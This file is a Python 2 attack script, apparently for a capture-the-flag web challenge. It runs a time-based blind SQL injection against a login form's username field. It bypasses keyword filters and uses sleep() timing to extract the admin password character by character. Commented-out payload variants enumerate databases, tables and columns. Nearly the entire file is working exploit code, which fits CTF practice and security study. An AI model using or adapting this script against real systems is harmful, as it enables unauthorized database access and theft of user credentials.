'''
Created on 2016-10-1

@author: wenhuizone
'''
# coding:utf-8
import time

import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Cookie': 'PHPSESSID=ubheb2rumf4ipiaur9hs1ng984'
}
payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.,{}@#$%&*!'
print '[%s] Start to retrive MYSQL User:' % time.strftime('%H:%M:%S', time.localtime())  #
user = ''
for i in range(1, 40):
    found = False
    while found == False:
        for payload in payloads:
            time_count = 0
            for j in range(1, 3):  #
                try:
                    # sql_inject="admin'/**/union/**/selselectect/**/1,if((ascii(mid((database()),%s,1))=%s),sleep(5),1)#" % (i,ord(payload))  #

                    # sql_inject="admin'/**/union/**/selselectect/**/1,if((selselectect((ascii(mid((selselectect(selselectect(group_concat(table_name))from(information_schema.tables)where(table_schema=0x637466))),%s,1)))=%s)),sleep(10),1)#" % (i,ord(payload))    WmpX

                    # sql_inject="admin'/**/union/**/selselectect/**/1,if((selselectect((ascii(mid((selselectect(selselectect(group_concat(table_name))from(information_schema.tables)where(table_schema=0x637466))),%s,1)))=%s)),sleep(10),1)#"
                    sql_inject = "admin'/**/union/**/selselectect/**/1,if((selselectect(ascii(mid((selselectect(passwd)from(users)where/**/user='admin'),%s,1))=%s)),sleep(6),1)#" % (
                        i, ord(payload))
                    #
                    # select if((select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=0x64767761),1,1))=103),sleep(3),1);
                    # sql_inject="flag1';(select(if((select((ascii(mid((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=0x696E6A656374696F6E))),%s,1)))=%s)),sleep(10),1)))#" % (i,ord(payload))#admin
                    # (select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)))
                    # sql_inject="flag1';(select(if((select((ascii(mid((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x61646D696E))),%s,1)))=%s)),sleep(10),1)))#" % (i,ord(payload))# id,username,password
                    #
                    # select(if((select(ascii((select(mid((select(user)from(users)where(user='admin')),1,1))))=97)),sleep(2),1))
                    # sql_inject="flag1';(select(if((select(ascii((select(mid((select(password)from(admin)where(id=1)),%s,1))))=%s)),sleep(10),1)))#" % (i,ord(payload))#admin,
                    data = {'uname': sql_inject, 'passwd': '111', "submit": "Submit"}
                    url = "http://web.l-ctf.com:6699/sh0p.php"
                    respons = requests.post(url, data=data, headers=headers, timeout=3)  #
                    print '.',
                    break
                except Exception, e:
                    # print e
                    time_count += 1
                    time.sleep(10)  #
                    # print payload,

            if time_count == 2:
                user += payload
                print '\n[In propress] now password is %s' % user
                found = True
                break
print '\nFinally,MYSQL user is', user
